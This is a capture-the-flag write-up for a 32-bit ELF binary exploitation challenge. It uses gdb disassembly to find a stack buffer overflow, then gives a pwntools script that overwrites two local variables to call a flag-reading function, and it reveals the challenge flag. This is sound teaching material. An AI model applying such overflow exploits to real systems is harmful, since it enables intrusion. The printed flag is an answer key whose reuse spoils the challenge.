# Kogarashi Café - The Forbidden Recipe

## Description
The final test. One last order, one last chance. Choose carefully—the café remembers.

- Author: Suraj
- flag: apoorvctf{d3caf_is_bad_f0r_0verfl0ws}

**Category : Binary Exploitation**

## Writeup

## Challenge Overview

This binary exploitation challenge involves a classic buffer overflow vulnerability that allows us to overwrite local variables to trigger a function that reads a flag file. The program simulates a café scenario where correctly manipulating the "order codes" will reveal a special recipe (the flag).

## Initial Binary Analysis

Let's start by examining the binary's properties:

```
$ file forbidden_recipe 
forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a1cbde252, not stripped
```

Key observations:
- 32-bit ELF executable
- Not stripped (function names are preserved)
- Intel x86 architecture

Next, let's check its security features:

```
$ checksec forbidden_recipe
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Important security details:
- No stack canary: The binary doesn't implement stack protection against buffer overflows
- NX enabled: The stack is non-executable, so we can't execute shellcode there
- No PIE: The binary is loaded at a fixed address (0x8048000), making exploitation more straightforward
- Partial RELRO: Not particularly relevant for this exploit

## Function Analysis with GDB

Let's load our binary into gdb
```
gdb forbidden_recipe
```

Now let's explore the binary's functions:

```
gdb-peda$ info functions
All defined functions:
Non-debugging symbols:
0x080483ac  _init
0x080483e0  setbuf@plt
0x080483f0  read@plt
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  fclose@plt
0x08048430  puts@plt
0x08048440  __libc_start_main@plt
0x08048450  fopen@plt
0x08048460  __gmon_start__@plt
0x08048470  _start
0x080484a0  __x86.get_pc_thunk.bx
0x080484b0  deregister_tm_clones
0x080484e0  register_tm_clones
0x08048520  __do_global_dtors_aux
0x08048540  frame_dummy
0x0804856b  win
0x080485e6  vuln
0x0804867f  main
0x080486c0  __libc_csu_init
0x08048720  __libc_csu_fini
0x08048724  _fini
```

The three main functions of interest are:
- `main`: Entry point
- `vuln`: Contains the vulnerable code
- `win`: Function that may contain the flag file

### Main Function Analysis

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804867f <+0>:	lea    ecx,[esp+0x4]
   0x08048683 <+4>:	and    esp,0xfffffff0
   0x08048686 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048689 <+10>:	push   ebp
   0x0804868a <+11>:	mov    ebp,esp
   0x0804868c <+13>:	push   ecx
   0x0804868d <+14>:	sub    esp,0x4
   0x08048690 <+17>:	mov    eax,ds:0x804a034
   0x08048695 <+22>:	sub    esp,0x8
   0x08048698 <+25>:	push   0x0
   0x0804869a <+27>:	push   eax
   0x0804869b <+28>:	call   0x80483e0 <setbuf@plt>
   0x080486a0 <+33>:	add    esp,0x10
   0x080486a3 <+36>:	call   0x80485e6 <vuln>
   0x080486a8 <+41>:	mov    eax,0x0
   0x080486ad <+46>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080486b0 <+49>:	leave
   0x080486b1 <+50>:	lea    esp,[ecx-0x4]
   0x080486b4 <+53>:	ret
End of assembler dump.
```

The `main` function is straightforward:
1. Sets up the stack frame
2. Calls the `vuln()` function
3. Returns 0

### Vulnerable Function Analysis

```
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080485e6 <+0>:	push   ebp
   0x080485e7 <+1>:	mov    ebp,esp
   0x080485e9 <+3>:	sub    esp,0x38
   0x080485ec <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080485f3 <+13>:	mov    DWORD PTR [ebp-0x10],0x0
   0x080485fa <+20>:	sub    esp,0xc
   0x080485fd <+23>:	push   0x80487c8
   0x08048602 <+28>:	call   0x8048430 <puts@plt>
   0x08048607 <+33>:	add    esp,0x10
   0x0804860a <+36>:	sub    esp,0xc
   0x0804860d <+39>:	push   0x80487ec
   0x08048612 <+44>:	call   0x8048430 <puts@plt>
   0x08048617 <+49>:	add    esp,0x10
   0x0804861a <+52>:	sub    esp,0x4
   0x0804861d <+55>:	push   0x28
   0x0804861f <+57>:	lea    eax,[ebp-0x30]
   0x08048622 <+60>:	push   eax
   0x08048623 <+61>:	push   0x0
   0x08048625 <+63>:	call   0x80483f0 <read@plt>
   0x0804862a <+68>:	add    esp,0x10
   0x0804862d <+71>:	cmp    DWORD PTR [ebp-0xc],0xc0ff33
   0x08048634 <+78>:	jne    0x8048656 <vuln+112>
   0x08048636 <+80>:	cmp    DWORD PTR [ebp-0x10],0xdecafbad
   0x0804863d <+87>:	jne    0x8048656 <vuln+112>
   0x0804863f <+89>:	sub    esp,0xc
   0x08048642 <+92>:	push   0x8048824
   0x08048647 <+97>:	call   0x8048430 <puts@plt>
   0x0804864c <+102>:	add    esp,0x10
   0x0804864f <+105>:	call   0x804856b <win>
   0x08048654 <+110>:	jmp    0x804867c <vuln+150>
   0x08048656 <+112>:	sub    esp,0x4
   0x08048659 <+115>:	push   DWORD PTR [ebp-0x10]
   0x0804865c <+118>:	push   DWORD PTR [ebp-0xc]
   0x0804865f <+121>:	push   0x8048860
   0x08048664 <+126>:	call   0x8048400 <printf@plt>
   0x08048669 <+131>:	add    esp,0x10
   0x0804866c <+134>:	sub    esp,0xc
   0x0804866f <+137>:	push   0x80488a4
   0x08048674 <+142>:	call   0x8048430 <puts@plt>
   0x08048679 <+147>:	add    esp,0x10
   0x0804867c <+150>:	nop
   0x0804867d <+151>:	leave
   0x0804867e <+152>:	ret
End of assembler dump.
```

The `vuln` function is where the vulnerability resides:

1. Sets up the stack frame and allocates 0x38 (56) bytes of space
2. Initializes two variables to 0:
   - `target1` at `[ebp-0xc]`
   - `target2` at `[ebp-0x10]`
3. Prints welcome messages
4. Calls `read(0, buffer, 0x28)`:
   - Reads up to 0x28 (40) bytes from stdin
   - Stores them in a buffer located at `[ebp-0x30]`
5. Checks if `target1` equals 0xc0ff33
6. Checks if `target2` equals 0xdecafbad
7. If both conditions are met, calls the `win()` function
8. Otherwise, prints the current values and a retry message

### Win Function Analysis

```
gdb-peda$ disas win
Dump of assembler code for function win:
   0x0804856b <+0>:	push   ebp
   0x0804856c <+1>:	mov    ebp,esp
   0x0804856e <+3>:	sub    esp,0x98
   0x08048574 <+9>:	sub    esp,0x8
   0x08048577 <+12>:	push   0x8048740
   0x0804857c <+17>:	push   0x8048742
   0x08048581 <+22>:	call   0x8048450 <fopen@plt>
   0x08048586 <+27>:	add    esp,0x10
   0x08048589 <+30>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804858c <+33>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08048590 <+37>:	je     0x80485d3 <win+104>
   0x08048592 <+39>:	sub    esp,0x4
   0x08048595 <+42>:	push   DWORD PTR [ebp-0xc]
   0x08048598 <+45>:	push   0x80
   0x0804859d <+50>:	lea    eax,[ebp-0x8c]
   0x080485a3 <+56>:	push   eax
   0x080485a4 <+57>:	call   0x8048410 <fgets@plt>
   0x080485a9 <+62>:	add    esp,0x10
   0x080485ac <+65>:	sub    esp,0x8
   0x080485af <+68>:	lea    eax,[ebp-0x8c]
   0x080485b5 <+74>:	push   eax
   0x080485b6 <+75>:	push   0x804874c
   0x080485bb <+80>:	call   0x8048400 <printf@plt>
   0x080485c0 <+85>:	add    esp,0x10
   0x080485c3 <+88>:	sub    esp,0xc
   0x080485c6 <+91>:	push   DWORD PTR [ebp-0xc]
   0x080485c9 <+94>:	call   0x8048420 <fclose@plt>
   0x080485ce <+99>:	add    esp,0x10
   0x080485d1 <+102>:	jmp    0x80485e3 <win+120>
   0x080485d3 <+104>:	sub    esp,0xc
   0x080485d6 <+107>:	push   0x8048790
   0x080485db <+112>:	call   0x8048430 <puts@plt>
   0x080485e0 <+117>:	add    esp,0x10
   0x080485e3 <+120>:	nop
   0x080485e4 <+121>:	leave
   0x080485e5 <+122>:	ret
End of assembler dump.
```

The function appears to be opening a file, reading from it, and printing its contents. To understand what file it's opening, we need to examine the memory addresses being pushed before the `fopen` call:

```assembly
0x08048577 <+12>:	push   0x8048740
0x0804857c <+17>:	push   0x8048742
```

To see what strings these addresses point to, we can use GDB to examine them:

```
gdb-peda$ x/s 0x8048742
0x8048742:      "flag.txt"
gdb-peda$ x/s 0x8048740
0x8048740:      "r"
```

The `win` function:
1. Opens a file ("flag.txt") using `fopen()`
2. If successful:
   - Reads up to 0x80 (128) bytes from the file using `fgets()`
   - Prints the contents (our flag)
   - Closes the file
3. If the file can't be opened, prints an error message

## Understanding the Vulnerability

Examining the `vuln` function reveals a classic buffer overflow:

1. The buffer is at `[ebp-0x30]` and is 32 bytes in size (inferred from the stack layout)
2. The `read` call allows reading up to 40 bytes (0x28)
3. The variables we need to overwrite are:
   - `target1` at `[ebp-0xc]`
   - `target2` at `[ebp-0x10]`

This means we can overflow the 32-byte buffer to overwrite these variables.

To exploit this, we need to:
1. Fill the 32-byte buffer with padding
2. Set `target2` to 0xdecafbad
3. Set `target1` to 0xc0ff33

## Creating the Exploit

Since this is a 32-bit binary, we need to be mindful of the byte order (little-endian). Here's a Python script to generate our payload:

```python
from pwn import *

#p = process('./forbidden_recipe')

p = remote('chals1.apoorvctf.xyz','3002') 
padding = 32
target1 = p32(0xc0ff33)
target2 = p32(0xdecafbad)

payload = b'A' * padding+ target2 + target1

p.sendline(payload)
p.interactive()
```

Let's double-check our exploit logic based on the stack layout:
- The buffer is at `[ebp-0x30]` and is 32 bytes long
- `target2` is at `[ebp-0x10]` (4 bytes)
- `target1` is at `[ebp-0xc]` (4 bytes)

Our payload matches this layout perfectly.

## Exploiting the Binary

When we run our exploit against the binary:

```
$ python exploit.py
Welcome back to Kogarashi Café.
Barista: 'I remember you... what will it be this time?'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xad\xfb\xca\xde3\xff\xc0^@
Barista: 'Ah... I knew you'd figure it out. One moment.'
Barista: 'Ah... I see you've returned for the special blend.'
apoorvctf{d3caf_is_bad_f0r_0verfl0ws}
```

Success! We've successfully exploited the buffer overflow and retrieved the flag.


## Conclusion

This challenge demonstrates a classic buffer overflow vulnerability with a straightforward exploitation path. By understanding the memory layout and the program's behavior, we were able to craft a precise payload that overwrites specific variables with the values needed to trigger the flag-revealing function.
